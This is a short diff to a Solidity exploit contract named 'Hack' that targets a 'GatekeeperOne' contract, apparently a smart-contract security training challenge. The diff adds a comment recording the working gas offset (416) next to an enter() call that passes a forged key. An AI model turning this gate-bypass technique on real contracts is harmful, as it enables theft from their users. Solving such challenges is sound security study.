@@ -19,7 +19,7 @@ contract Hack {
         uint64 keyPartTwo = uint64(1 << 63) + uint64(keyPartOne);
 
         bytes8 keyFull = bytes8(keyPartTwo);
-
+// corect gas = 416
         require(targetI.enter{gas: 8191 + gas}(keyFull), "failed enter");
     }
 }
@@ -48,4 +48,5 @@ contract GatekeeperOne {
         entrant = tx.origin;
         return true;
     }
+
 }
